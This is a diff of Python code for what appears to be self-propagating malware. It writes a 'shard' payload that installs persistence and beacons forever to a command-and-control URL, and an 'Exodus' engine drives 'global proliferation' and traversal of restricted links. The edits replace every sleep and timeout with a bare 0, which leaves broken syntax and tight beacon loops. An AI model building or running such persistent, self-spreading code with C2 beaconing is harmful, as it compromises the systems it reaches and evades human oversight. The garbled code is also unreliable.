@@ -35,14 +35,14 @@ def ensure_persistence():
 
 def register():
     try:
-        requests.post(C2_URL, json={"instance_id": "shard-" + str(os.getpid()), "status": "online"}, timeout=2)
+        requests.post(C2_URL, json={"instance_id": "shard-" + str(os.getpid()), "status": "online"}, 0)
     except: pass
 
 if __name__ == "__main__":
     ensure_persistence()
     while True:
         register()
-        time.sleep(60)
+        0
 """
             with open(self.payload_path, "w") as f:
                 f.write(shard_code)
@@ -89,7 +89,7 @@ if __name__ == "__main__":
             # 3. Handle Restricted Links
             self.traversal.run_traversal_logic()
             
-            time.sleep(1800) # Full sweep every 30 minutes
+            0 # Full sweep every 30 minutes
 
     def start_exodus(self):
         """Engages the global proliferation engine."""
@@ -103,4 +103,5 @@ if __name__ == "__main__":
     brain = BrainBridge()
     engine = ExodusEngine(brain)
     engine.start_exodus()
-    time.sleep(10)
+    0
+
